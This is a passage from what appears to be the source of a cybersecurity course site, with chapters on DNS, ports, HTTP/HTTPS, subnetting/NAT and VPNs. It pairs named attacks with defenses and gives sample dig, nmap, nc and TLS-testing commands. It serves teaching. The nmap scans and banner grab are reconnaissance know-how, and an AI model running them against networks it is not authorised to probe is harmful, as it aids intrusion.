                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>Spoofing / Cache Poisoning</strong> — Inject false records; redirect users</li>
                      <li><strong>DNS Tunneling</strong> — Encapsulate non-DNS traffic inside DNS queries to bypass firewalls</li>
                      <li><strong>Amplification DDoS</strong> — Spoof victim IP in queries; resolvers flood the victim</li>
                      <li><strong>Hijacking</strong> — Modify router DNS, malware, or rogue resolvers</li>
                      <li><strong>Subdomain Takeover</strong> — Claim abandoned subdomain resources</li>
                      <li><strong>Reconnaissance</strong> — Map infrastructure via DNS enumeration</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>DNSSEC</strong> — Cryptographic signatures on records</li>
                      <li><strong>DoH / DoT</strong> — Encrypt DNS queries end-to-end</li>
                      <li><strong>Trusted Resolvers</strong> — Cloudflare 1.1.1.1, Google 8.8.8.8, Quad9 9.9.9.9</li>
                      <li><strong>DNS Filtering</strong> — Block known malicious domains</li>
                      <li><strong>Rate Limiting (RRL)</strong> — Prevent amplification</li>
                      <li><strong>Monitoring</strong> — Detect query spikes and unusual types</li>
                      <li><strong>Secure Config</strong> — Disable open recursion; restrict zone transfers</li>
                      <li><strong>Email Records</strong> — SPF, DKIM, DMARC prevent email spoofing</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Common DNS Commands</h4>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>dig / nslookup / host</span></div>
                  <pre><code>dig example.com A
dig example.com MX
dig @8.8.8.8 example.com
nslookup example.com
nslookup -type=MX example.com
host example.com</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>DNS translates domain names into IP addresses.</li>
                  <li>The hierarchy is: root → TLD → authoritative servers.</li>
                  <li>Records: A, AAAA, CNAME, MX, NS, TXT, PTR, SRV.</li>
                  <li>Caching and TTL improve performance.</li>
                  <li>Attacks: spoofing, poisoning, tunneling, amplification, hijacking.</li>
                  <li>Defenses: DNSSEC, DoH/DoT, trusted resolvers, filtering, monitoring.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.cloudflare.com/learning/dns/" target="_blank" rel="noopener">Cloudflare Learning — DNS explained</a>
                  <a href="https://www.dnssec.net/" target="_blank" rel="noopener">DNSSEC.net — DNS security extensions</a>
                  <a href="https://github.com/OWASP/Amass" target="_blank" rel="noopener">OWASP Amass — Attack surface mapping</a>
                  <a href="https://github.com/iagox86/dnscat2" target="_blank" rel="noopener">dnscat2 — DNS tunneling</a>
                  <a href="https://tools.ietf.org/html/rfc1034" target="_blank" rel="noopener">RFC 1034/1035 — DNS specification</a>
                </div>
              </section>
            ` },
                    { id: "1.11", title: "Ports & Protocols", pages: "143-154", read: 17,
            build: "Write a cheatsheet of the 25 most important ports with attack context.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>A <strong>port</strong> is a logical numeric identifier (0–65535) used by the Transport Layer (Layer 4) to distinguish different network services on the same device. When a packet arrives, the OS uses the destination port to deliver data to the correct application.</p>
                <p>A <strong>protocol</strong> is a set of rules governing how data is transmitted and received — defining format, timing, sequencing, and error control. Together, ports and protocols allow multiple applications to communicate over one network without interfering.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>Think of an apartment building. The building has one street address (IP). Inside, each apartment has a unique number (port). The mail carrier finds the building by street address, then delivers to the correct apartment.</p>
                <p>The same with servers: IP finds the server; port identifies the service. A web server listens on 80/443, email on 25, DNS on 53 — all on the same machine.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Port Ranges</h3>
                <figure class="content-figure">
                  <img src="./img/ports-protocols.png" alt="Port ranges — well-known, registered, dynamic" />
                  <figcaption>Figure 11.1 — Port ranges. Well-known ports (0–1023) serve standard protocols; registered ports (1024–49151) for applications; dynamic ports (49152–65535) for client connections.</figcaption>
                </figure>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Range</span><span>Name</span><span>Purpose</span></div>
                  <div class="tool-row"><span>0 – 1023</span><span>Well-Known</span><span>Standard services (HTTP, SSH, DNS)</span></div>
                  <div class="tool-row"><span>1024 – 49151</span><span>Registered</span><span>User applications</span></div>
                  <div class="tool-row"><span>49152 – 65535</span><span>Dynamic / Private</span><span>Client-side temporary connections</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. The 25 Essential Ports</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Port</span><span>Protocol</span><span>Service</span></div>
                  <div class="tool-row"><span>20, 21</span><span>TCP</span><span>FTP (Data, Control)</span></div>
                  <div class="tool-row"><span>22</span><span>TCP</span><span>SSH</span></div>
                  <div class="tool-row"><span>23</span><span>TCP</span><span>Telnet</span></div>
                  <div class="tool-row"><span>25</span><span>TCP</span><span>SMTP</span></div>
                  <div class="tool-row"><span>53</span><span>UDP / TCP</span><span>DNS</span></div>
                  <div class="tool-row"><span>67, 68</span><span>UDP</span><span>DHCP</span></div>
                  <div class="tool-row"><span>80</span><span>TCP</span><span>HTTP</span></div>
                  <div class="tool-row"><span>110</span><span>TCP</span><span>POP3</span></div>
                  <div class="tool-row"><span>143</span><span>TCP</span><span>IMAP</span></div>
                  <div class="tool-row"><span>161</span><span>UDP</span><span>SNMP</span></div>
                  <div class="tool-row"><span>443</span><span>TCP</span><span>HTTPS</span></div>
                  <div class="tool-row"><span>445</span><span>TCP</span><span>SMB</span></div>
                  <div class="tool-row"><span>3389</span><span>TCP</span><span>RDP</span></div>
                </div>

                <h4 class="sub-h">TCP vs UDP Ports</h4>
                <ul class="content-list">
                  <li><strong>TCP Ports</strong> — Connection-oriented; used for HTTP, SSH, FTP</li>
                  <li><strong>UDP Ports</strong> — Connectionless; used for DNS, DHCP, VoIP</li>
                  <li>Port 53 is used by DNS over both UDP (queries) and TCP (large responses) — distinct logical endpoints</li>
                </ul>

                <h4 class="sub-h">Sockets</h4>
                <p>A <strong>socket</strong> is an IP + port pair. A connection is uniquely identified by a <strong>socket pair</strong>: source IP, source port, destination IP, destination port.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. TCP vs UDP</h3>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Feature</span><span>TCP</span><span>UDP</span></div>
                  <div class="tool-row"><span>Connection</span><span>Connection-oriented</span><span>Connectionless</span></div>
                  <div class="tool-row"><span>Reliability</span><span>Acknowledged + retransmit</span><span>No guarantees</span></div>
                  <div class="tool-row"><span>Ordering</span><span>Ordered</span><span>Unordered</span></div>
                  <div class="tool-row"><span>Speed</span><span>Slower</span><span>Faster</span></div>
                  <div class="tool-row"><span>Header Size</span><span>20–60 bytes</span><span>8 bytes</span></div>
                  <div class="tool-row"><span>Use Cases</span><span>Web, email, file transfer</span><span>DNS, DHCP, VoIP, streaming</span></div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>Port Scanning</strong> — Discover open ports (Nmap, Masscan)</li>
                      <li><strong>Banner Grabbing</strong> — Read service banner to fingerprint versions</li>
                      <li><strong>Service Exploitation</strong> — FTP anon login, SSH brute force, Telnet plaintext, RDP BlueKeep</li>
                      <li><strong>Tunneling</strong> — Encapsulate traffic over allowed ports (SSH over 443)</li>
                      <li><strong>DoS</strong> — SYN flood on port 80</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>Default Deny Firewall</strong> — Block all, allow only necessary ports</li>
                      <li><strong>Least Privilege</strong> — Minimal open ports</li>
                      <li><strong>Service Hardening</strong> — Disable unused services; patch</li>
                      <li><strong>IDS/IPS</strong> — Detect port scan patterns</li>
                      <li><strong>Network Segmentation</strong> — VLANs, DMZ</li>
                      <li><strong>Encryption</strong> — SSH not Telnet, SFTP not FTP, HTTPS everywhere</li>
                      <li><strong>Port Knocking</strong> — Hide services from scanners</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Essential Commands</h4>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Port discovery and analysis</span></div>
                  <pre><code>nmap -sS 192.168.1.1          # SYN scan
nmap -sV 192.168.1.1          # Version detection
nmap -p 1-1000 192.168.1.1    # Specific range
netstat -tuln                  # Listening ports (Linux)
ss -tuln                       # Socket stats (Linux)
nc -v 192.168.1.1 80           # Banner grab</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Ports are logical endpoints for network communication.</li>
                  <li>Ranges: Well-Known (0–1023), Registered (1024–49151), Dynamic (49152–65535).</li>
                  <li>TCP is reliable and connection-oriented; UDP is fast and connectionless.</li>
                  <li>Common ports: 80 HTTP, 443 HTTPS, 22 SSH, 21 FTP, 25 SMTP, 53 DNS, 3389 RDP.</li>
                  <li>Attacks: port scanning, banner grabbing, exploitation, tunneling, DoS.</li>
                  <li>Defenses: firewalls, port security, service hardening, IDS/IPS, segmentation, encryption.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">8. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Port scanning</a>
                  <a href="https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml" target="_blank" rel="noopener">IANA — Official Port Registry</a>
                  <a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan — Search exposed ports</a>
                  <a href="https://www.wireshark.org/" target="_blank" rel="noopener">Wireshark — Packet analysis</a>
                </div>
              </section>
            ` },
                    { id: "1.12", title: "HTTP & HTTPS", pages: "155-166", read: 18,
            build: "Compare HTTP vs HTTPS traffic in Wireshark. Perform an SSL strip lab.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>HTTP (Hypertext Transfer Protocol)</strong> is an Application Layer protocol for transmitting hypermedia documents between a client and a server. It operates on TCP port <code>80</code> by default and is <strong>stateless</strong> — each request-response pair is independent.</p>
                <p><strong>HTTPS (HTTP Secure)</strong> is HTTP over TLS/SSL, encrypting all communication. It operates on TCP port <code>443</code> and provides <strong>confidentiality, integrity, and authentication</strong>.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>Typing <code>http://example.com</code> sends your request in plaintext — anyone on the same Wi-Fi can read your passwords and cookies.</p>
                <p>Typing <code>https://example.com</code> triggers a TLS handshake. All data is encrypted. Even if an attacker intercepts, they see only ciphertext.</p>
                <p>This is why banking, e-commerce, and email services all use HTTPS by default.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. HTTP In Depth</h3>
                <figure class="content-figure">
                  <img src="./img/http-https.png" alt="HTTP vs HTTPS — plaintext vs encrypted TLS tunnel" />
                  <figcaption>Figure 12.1 — HTTP vs HTTPS. HTTP transmits in plaintext over port 80; HTTPS wraps the same messages inside an encrypted TLS tunnel on port 443.</figcaption>
                </figure>

                <h4 class="sub-h">HTTP Request Methods</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Method</span><span>Purpose</span></div>
                  <div class="tool-row"><span>GET</span><span>Retrieve data from server</span></div>
                  <div class="tool-row"><span>POST</span><span>Submit data (form)</span></div>
                  <div class="tool-row"><span>PUT</span><span>Update existing resource</span></div>
                  <div class="tool-row"><span>DELETE</span><span>Remove resource</span></div>
                  <div class="tool-row"><span>PATCH</span><span>Partial update</span></div>
                  <div class="tool-row"><span>HEAD / OPTIONS</span><span>Metadata / capabilities</span></div>
                </div>

                <h4 class="sub-h">Common Status Codes</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Code</span><span>Meaning</span></div>
                  <div class="tool-row"><span>200</span><span>OK</span></div>
                  <div class="tool-row"><span>301 / 302</span><span>Moved Permanently / Temporary Redirect</span></div>
                  <div class="tool-row"><span>400</span><span>Bad Request</span></div>
                  <div class="tool-row"><span>401 / 403</span><span>Unauthorized / Forbidden</span></div>
                  <div class="tool-row"><span>404</span><span>Not Found</span></div>
                  <div class="tool-row"><span>500 / 503</span><span>Server Error / Unavailable</span></div>
                </div>

                <h4 class="sub-h">Cookies and Sessions</h4>
                <p>HTTP is stateless — to remember users, cookies store small data on the client. The server keeps the session state, identified by a session ID.</p>

                <h4 class="sub-h">HTTP/1.1 vs HTTP/2 vs HTTP/3</h4>
                <ul class="content-list">
                  <li><strong>HTTP/1.1</strong> — One request per connection; head-of-line blocking</li>
                  <li><strong>HTTP/2</strong> — Multiplexing, header compression, binary protocol; still TCP</li>
                  <li><strong>HTTP/3</strong> — Uses QUIC over UDP; faster, lower latency</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. HTTPS In Depth</h3>

                <h4 class="sub-h">The TLS Handshake</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Client Hello — supported TLS versions, cipher suites, random value</div>
                  <div class="step-item"><span class="step-num">2</span> Server Hello — chosen TLS version, cipher suite, certificate, random value</div>
                  <div class="step-item"><span class="step-num">3</span> Certificate Verification — client validates against trusted CAs</div>
                  <div class="step-item"><span class="step-num">4</span> Key Exchange — derive shared session key (ECDHE, RSA)</div>
                  <div class="step-item"><span class="step-num">5</span> Finished — encrypted "Finished" messages; secure channel established</div>
                </div>

                <h4 class="sub-h">Why HTTPS Matters</h4>
                <ul class="content-list">
                  <li><strong>Confidentiality</strong> — data encrypted in transit</li>
                  <li><strong>Integrity</strong> — modifications are detected</li>
                  <li><strong>Authentication</strong> — server identity verified via certificates</li>
                  <li><strong>SEO</strong> — search engines rank HTTPS higher</li>
                  <li><strong>Trust</strong> — padlock icon in browser</li>
                </ul>

                <h4 class="sub-h">HSTS — HTTP Strict Transport Security</h4>
                <p>An HTTP response header instructing the browser to only use HTTPS for future requests to that domain. Prevents SSL stripping attacks.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>Eavesdropping on HTTP</strong> — plaintext capture via Wireshark</li>
                      <li><strong>MITM</strong> — intercept and modify traffic (mitmproxy, Bettercap)</li>
                      <li><strong>SSL Stripping</strong> — downgrade HTTPS to HTTP (sslstrip)</li>
                      <li><strong>Certificate Spoofing</strong> — fake certs or compromised CAs</li>
                      <li><strong>Session Hijacking</strong> — steal cookies via XSS or sniffing</li>
                      <li><strong>SQLi / XSS</strong> — inject payloads into HTTP parameters</li>
                      <li><strong>DDoS</strong> — flood servers with requests</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>HTTPS Everywhere</strong> — redirect all HTTP to HTTPS</li>
                      <li><strong>HSTS header</strong> — force HTTPS at the browser</li>
                      <li><strong>Let's Encrypt</strong> — free trusted certificates</li>
                      <li><strong>Secure Cookies</strong> — HttpOnly, Secure, SameSite</li>
                      <li><strong>TLS 1.2/1.3 only</strong> — disable old versions, weak ciphers</li>
                      <li><strong>Forward Secrecy</strong> — ECDHE key exchange</li>
                      <li><strong>WAF</strong> — block SQLi, XSS, API attacks</li>
                      <li><strong>Security Headers</strong> — CSP, X-Frame-Options, Referrer-Policy</li>
                      <li><strong>Rate Limiting</strong> — prevent brute force and DDoS</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Testing HTTPS</h4>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>TLS / HTTP testing commands</span></div>
                  <pre><code>curl -I https://example.com
openssl s_client -connect example.com:443
nmap --script ssl-enum-ciphers -p 443 example.com
sslscan example.com:443
testssl.sh example.com</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>HTTP is plaintext, stateless, on port 80. HTTPS is HTTP over TLS on port 443.</li>
                  <li>Methods: GET, POST, PUT, DELETE, PATCH. Status codes: 200, 401, 403, 404, 500.</li>
                  <li>The TLS handshake establishes an encrypted, authenticated channel.</li>
                  <li>Certificates verify server identity via trusted CAs.</li>
                  <li>Attacks: eavesdropping, MITM, SSL stripping, session hijacking, SQLi, XSS.</li>
                  <li>Defenses: HTTPS everywhere, HSTS, secure cookies, strong TLS, WAF, CSP.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://portswigger.net/burp" target="_blank" rel="noopener">Burp Suite — Web proxy</a>
                  <a href="https://www.zaproxy.org/" target="_blank" rel="noopener">OWASP ZAP — Scanner</a>
                  <a href="https://mitmproxy.org/" target="_blank" rel="noopener">mitmproxy — HTTPS proxy</a>
                  <a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">Qualys SSL Labs — TLS analysis</a>
                  <a href="https://hstspreload.org/" target="_blank" rel="noopener">HSTS Preload — Submit domains</a>
                  <a href="https://securityheaders.com/" target="_blank" rel="noopener">SecurityHeaders.com — Header check</a>
                </div>
              </section>
            ` },
                    { id: "1.13", title: "Subnetting & NAT", pages: "167-180", read: 22,
            build: "Subnet a /24 into four /26 networks. Set up NAT in a lab router.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p><strong>Subnetting</strong> divides a single IP network into multiple smaller logical sub-networks (subnets). It improves performance, enhances security, reduces broadcast traffic, and enables efficient IP usage.</p>
                <p><strong>NAT (Network Address Translation)</strong> lets a router translate private IPs inside a local network to a public IP for Internet communication. It conserves IPv4 space and hides internal structure.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. A Real-World Analogy</h3>
                <p>A small office has one public IP from its ISP. Twenty devices inside use private IPs (192.168.1.x). When they send data out, the router translates each private IP to the public IP and tracks the mapping. Responses return correctly — that is NAT.</p>
                <p>Now the office divides into Sales, HR, and IT — three subnets: <code>192.168.1.0/26</code>, <code>.64/26</code>, <code>.128/26</code>. Isolating broadcast domains and enforcing firewall rules between departments — that is subnetting.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. Subnetting In Depth</h3>
                <figure class="content-figure">
                  <img src="./img/subnetting-nat.png" alt="Subnetting a /24 into /26 subnets and NAT translation of private IPs to public" />
                  <figcaption>Figure 13.1 — Subnetting and NAT combined. A /24 is split into four /26 subnets; private IPs are then translated to a shared public IP at the router.</figcaption>
                </figure>

                <h4 class="sub-h">Purpose of Subnetting</h4>
                <ul class="content-list">
                  <li>Reduce broadcast traffic — each subnet is its own broadcast domain</li>
                  <li>Improve security — subnets can be isolated by routers and firewalls</li>
                  <li>Efficient IP allocation — allocate only what is needed</li>
                  <li>Simplify troubleshooting — smaller, more manageable networks</li>
                  <li>Enable logical grouping — by department, floor, or device type</li>
                </ul>

                <h4 class="sub-h">Subnet Mask and CIDR</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>CIDR</span><span>Subnet Mask</span><span>Usable Hosts</span></div>
                  <div class="tool-row"><span>/24</span><span>255.255.255.0</span><span>254</span></div>
                  <div class="tool-row"><span>/25</span><span>255.255.255.128</span><span>126</span></div>
                  <div class="tool-row"><span>/26</span><span>255.255.255.192</span><span>62</span></div>
                  <div class="tool-row"><span>/27</span><span>255.255.255.224</span><span>30</span></div>
                  <div class="tool-row"><span>/28</span><span>255.255.255.240</span><span>14</span></div>
                  <div class="tool-row"><span>/29</span><span>255.255.255.248</span><span>6</span></div>
                  <div class="tool-row"><span>/30</span><span>255.255.255.252</span><span>2</span></div>
                </div>
                <p><strong>Formula:</strong> Usable hosts = 2^(32−CIDR) − 2 (subtract network and broadcast).</p>

                <h4 class="sub-h">Worked Example — Dividing 192.168.1.0/24 into Four Subnets</h4>
                <p>Need 4 subnets → 2 borrowed bits (2² = 4). New CIDR = <code>/26</code>, mask <code>255.255.255.192</code>. Each subnet has 64 addresses (62 usable).</p>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Subnet</span><span>Network</span><span>Usable Range</span><span>Broadcast</span></div>
                  <div class="tool-row"><span>1</span><span>.0/26</span><span>.1 – .62</span><span>.63</span></div>
                  <div class="tool-row"><span>2</span><span>.64/26</span><span>.65 – .126</span><span>.127</span></div>
                  <div class="tool-row"><span>3</span><span>.128/26</span><span>.129 – .190</span><span>.191</span></div>
                  <div class="tool-row"><span>4</span><span>.192/26</span><span>.193 – .254</span><span>.255</span></div>
                </div>

                <h4 class="sub-h">VLSM and CIDR</h4>
                <p><strong>VLSM (Variable Length Subnet Masking)</strong> allows different sizes per subnet — a point-to-point link can use <code>/30</code>, a department <code>/26</code>. This optimizes address usage. CIDR notation (<code>192.168.1.0/24</code>) is the modern replacement for classful addressing.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. NAT In Depth</h3>

                <h4 class="sub-h">Purpose of NAT</h4>
                <ul class="content-list">
                  <li>Conserve IPv4 addresses — many devices share one public IP</li>
                  <li>Hide internal network — external hosts cannot see internal IPs</li>
                  <li>Add incidental security — inbound connections blocked unless port forwarding</li>
                  <li>Enable flexibility — change ISP without reconfiguring internal devices</li>
                </ul>

                <h4 class="sub-h">Types of NAT</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Mapping</span><span>Use Case</span></div>
                  <div class="tool-row"><span>Static NAT</span><span>One-to-one</span><span>Public web server</span></div>
                  <div class="tool-row"><span>Dynamic NAT</span><span>Many-to-many (pool)</span><span>Small office with IPs</span></div>
                  <div class="tool-row"><span>PAT / Overloading</span><span>Many-to-one (ports)</span><span>Home router</span></div>
                </div>

                <h4 class="sub-h">How PAT Works — Worked Example</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Internal device <code>192.168.1.10:54321</code> → web server <code>203.0.113.5:80</code></div>
                  <div class="step-item"><span class="step-num">2</span> Router rewrites source to <code>198.51.100.1:40001</code> (its public IP + unique port)</div>
                  <div class="step-item"><span class="step-num">3</span> Router stores mapping: <code>192.168.1.10:54321 ↔ 198.51.100.1:40001</code></div>
                  <div class="step-item"><span class="step-num">4</span> Web server replies to <code>198.51.100.1:40001</code></div>
                  <div class="step-item"><span class="step-num">5</span> Router looks up mapping and forwards to <code>192.168.1.10:54321</code></div>
                </div>

                <h4 class="sub-h">NAT Limitations</h4>
                <ul class="content-list">
                  <li>Breaks end-to-end connectivity</li>
                  <li>Issues with protocols embedding IPs (SIP, FTP)</li>
                  <li>Complicates logging and forensics</li>
                  <li>Not a substitute for a firewall or encryption</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">5. Attack Vectors</h3>
                <div class="cia-grid">
                  <div class="cia-attack">
                    <span class="cia-label attack">Known Attacks</span>
                    <ul>
                      <li><strong>Subnet Scanning</strong> — Enumerate live hosts and ports</li>
                      <li><strong>Lateral Movement</strong> — Subnet hopping via trust relationships</li>
                      <li><strong>NAT Traversal</strong> — UPnP, STUN, TURN, hole punching</li>
                      <li><strong>NAT Slipstreaming</strong> — Browser trick opens router port via NAT</li>
                      <li><strong>Port Forwarding Abuse</strong> — Exposed RDP/SSH/webcams</li>
                      <li><strong>Subnet Misconfiguration</strong> — Overlapping subnets, broadcast storms</li>
                    </ul>
                  </div>
                  <div class="cia-defense">
                    <span class="cia-label defense">Defensive Controls</span>
                    <ul>
                      <li><strong>Segment by Function</strong> — Separate servers, workstations, IoT, guest Wi-Fi</li>
                      <li><strong>VLANs + Subnets</strong> — Logical isolation</li>
                      <li><strong>ACLs Between Subnets</strong> — Only necessary traffic</li>
                      <li><strong>Default Deny</strong> — Block all, allow specific</li>
                      <li><strong>Disable UPnP</strong> — Prevent auto port opening</li>
                      <li><strong>Use VPN for Remote Access</strong> — Not exposed RDP/SSH</li>
                      <li><strong>Monitor NAT Logs</strong> — Anomaly detection</li>
                      <li><strong>Zero Trust</strong> — Micro-segmentation, least privilege</li>
                    </ul>
                  </div>
                </div>

                <h4 class="sub-h">Subnetting &amp; NAT Commands</h4>
                <div class="chapter-code-block">
                  <div class="code-block-head"><span>Subnetting / NAT inspection</span></div>
                  <pre><code>ipcalc 192.168.1.0/24          # Subnet calculator
nmap -sn 192.168.1.0/24        # Ping sweep
nmap -sS 192.168.1.0/24        # SYN scan
iptables -t nat -L -n -v       # List NAT rules (Linux)
show ip nat translations       # Cisco IOS</code></pre>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">6. Key Takeaways</h3>
                <ul class="content-list takeaways">
                  <li>Subnetting divides networks into smaller, manageable segments.</li>
                  <li>Subnet mask and CIDR define network and host portions.</li>
                  <li>NAT translates private IPs to public IPs, conserving IPv4 space.</li>
                  <li>PAT allows many devices to share one public IP.</li>
                  <li>NAT provides incidental security but is not a firewall.</li>
                  <li>Attacks: subnet scanning, lateral movement, NAT traversal, port forwarding abuse.</li>
                  <li>Defenses: segmentation, ACLs, firewalls, disable UPnP, monitoring, Zero Trust.</li>
                </ul>
              </section>

              <section class="content-block">
                <h3 class="content-h">7. Further Reading</h3>
                <div class="reading-list">
                  <a href="https://www.subnet-calculator.com/" target="_blank" rel="noopener">Subnet Calculator</a>
                  <a href="https://cidr.xyz/" target="_blank" rel="noopener">CIDR to Subnet Mask</a>
                  <a href="https://nmap.org/" target="_blank" rel="noopener">Nmap — Subnet discovery</a>
                  <a href="https://www.pfsense.org/" target="_blank" rel="noopener">pfSense — Firewall/router with NAT</a>
                  <a href="https://www.netfilter.org/" target="_blank" rel="noopener">iptables — Linux firewall &amp; NAT</a>
                </div>
              </section>
            ` },
                    { id: "1.14", title: "VPN & Firewall", pages: "181-196", read: 20,
            build: "Set up an OpenVPN tunnel. Write a 10-rule firewall policy.",
            content: `
              <section class="content-block">
                <h3 class="content-h">1. Introduction</h3>
                <p>A <strong>VPN (Virtual Private Network)</strong> creates a secure, encrypted tunnel over a public network to connect a device or private network to another. It ensures confidentiality, integrity, and authentication of data in transit, and masks the user's IP address.</p>
                <p>A <strong>firewall</strong> monitors and controls incoming and outgoing traffic based on predetermined rules. It establishes a barrier between a trusted internal network and untrusted external networks. Firewalls may be hardware, software, or cloud-based.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">2. Real-World Scenarios</h3>
                <p><strong>VPN:</strong> An employee working from home needs the company's internal file server. Instead of exposing the server, the company provides a VPN. The laptop creates an encrypted tunnel to the company — traffic is encrypted and the employee works as if in-office.</p>
                <p><strong>Firewall:</strong> A web server in the DMZ is protected by a firewall. Only ports 80 and 443 are allowed in; everything else is blocked. Outbound traffic to known-malicious IPs is dropped.</p>
              </section>

              <section class="content-block">
                <h3 class="content-h">3. VPN In Depth</h3>
                <figure class="content-figure">
                  <img src="./img/vpn-firewall.png" alt="VPN tunnel across the Internet alongside a firewall filtering traffic" />
                  <figcaption>Figure 14.1 — VPN and firewall working together. The VPN provides an encrypted tunnel for remote access; the firewall filters all inbound and outbound traffic at the perimeter.</figcaption>
                </figure>

                <h4 class="sub-h">Purpose of VPN</h4>
                <ul class="content-list">
                  <li><strong>Confidentiality</strong> — encrypts data so eavesdroppers cannot read it</li>
                  <li><strong>Integrity</strong> — ensures data is not modified in transit</li>
                  <li><strong>Authentication</strong> — verifies endpoint identity</li>
                  <li><strong>Privacy</strong> — hides the real IP address</li>
                  <li><strong>Remote Access</strong> — secure access to private networks from anywhere</li>
                  <li><strong>Site-to-Site</strong> — connect branch offices securely over the Internet</li>
                </ul>

                <h4 class="sub-h">Types of VPN</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Type</span><span>Purpose</span></div>
                  <div class="tool-row"><span>Remote Access</span><span>Individual users to private network</span></div>
                  <div class="tool-row"><span>Site-to-Site</span><span>Whole network to whole network (branch → HQ)</span></div>
                  <div class="tool-row"><span>SSL/TLS VPN</span><span>Browser-based access via HTTPS</span></div>
                  <div class="tool-row"><span>IPsec VPN</span><span>Protocol-suite-based encryption</span></div>
                  <div class="tool-row"><span>MPLS VPN</span><span>Service provider segmentation</span></div>
                  <div class="tool-row"><span>DMVPN</span><span>Dynamic Multipoint — scalable hub-and-spoke</span></div>
                </div>

                <h4 class="sub-h">VPN Protocols</h4>
                <div class="tool-table">
                  <div class="tool-row tool-header"><span>Protocol</span><span>Notes</span></div>
                  <div class="tool-row"><span>PPTP</span><span>Obsolete, weak — do not use</span></div>
                  <div class="tool-row"><span>L2TP/IPsec</span><span>Secure if configured well</span></div>
                  <div class="tool-row"><span>OpenVPN</span><span>Open-source, flexible, very secure</span></div>
                  <div class="tool-row"><span>WireGuard</span><span>Modern, lightweight, fast</span></div>
                  <div class="tool-row"><span>IKEv2/IPsec</span><span>Secure, good for mobile</span></div>
                  <div class="tool-row"><span>SSTP</span><span>Windows-centric</span></div>
                </div>

                <h4 class="sub-h">How VPN Works</h4>
                <div class="step-flow">
                  <div class="step-item"><span class="step-num">1</span> Tunnel establishment — mutual authentication via certs or pre-shared keys</div>
                  <div class="step-item"><span class="step-num">2</span> Encryption — symmetric keys (AES) protect the payload</div>
                  <div class="step-item"><span class="step-num">3</span> Encapsulation — encrypted data wrapped in IPsec or SSL</div>
                  <div class="step-item"><span class="step-num">4</span> Transmission — packet travels over the public Internet</div>
                  <div class="step-item"><span class="step-num">5</span> Decapsulation — VPN server decrypts and forwards to internal network</div>
                </div>
              </section>

              <section class="content-block">
                <h3 class="content-h">4. Firewall In Depth</h3>

                <h4 class="sub-h">Purpose of Firewall</h4>
                <ul class="content-list">
